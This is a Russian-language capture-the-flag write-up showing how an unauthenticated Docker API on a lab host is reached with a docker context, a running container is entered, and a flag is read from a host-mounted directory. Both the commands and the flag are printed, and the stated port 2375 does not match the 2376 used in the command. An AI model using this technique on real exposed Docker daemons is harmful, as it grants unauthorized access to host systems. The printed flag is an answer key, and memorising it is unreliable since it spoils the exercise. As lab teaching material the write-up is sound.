# Контейнеры

Сканируем всю сеть и находим этот хост и порт на нём: `10.10.13.46:2375`. Там находится Docker. Создаём у себя контекст:
```bash
docker context create nto --docker "host=tcp://10.10.13.46:2376"
```

Видим один запущенный контейнер:
```bash
└─$ docker ps -a
CONTAINER ID   IMAGE               COMMAND                  CREATED        STATUS                      PORTS     NAMES
82b4f0f6fe52   nginx:latest        "/docker-entrypoint.…"   2 months ago   Up 3 days                   80/tcp    root-ubuntu-1
85d722bc884a   nginx:latest        "/docker-entrypoint.…"   4 months ago   Exited (0) 4 months ago               user-ubuntu-1
324b745a1a2d   nginx               "/docker-entrypoint.…"   4 months ago   Exited (0) 4 months ago               fervent_murdock
51a85f0216b8   hello-world         "/hello"                 4 months ago   Exited (0) 4 months ago               competent_brattain
7797dc0d603b   containous/whoami   "/whoami"                4 months ago   Exited (2) 4 months ago               bold_fermi
3e8e66c5db8c   containous/whoami   "/whoami -d"             4 months ago   Exited (2) 4 months ago               gallant_sammet
99e8ba8a99c1   containous/whoami   "/whoami"                4 months ago   Exited (2) 4 months ago               peaceful_wing
d9ef89a57178   containous/whoami   "/whoami"                4 months ago   Exited (255) 4 months ago   80/tcp    amazing_greider
```

exec-каемся в него, и по пути `/hostdir/home/user/flag.txt` находим флаг:
```bash
root@82b4f0f6fe52:~# cat /hostdir/home/user/flag.txt
nto{Ne_Zabyavay_Zakryavat_Socket_2375}
```

**Флаг:** `nto{Ne_Zabyavay_Zakryavat_Socket_2375}`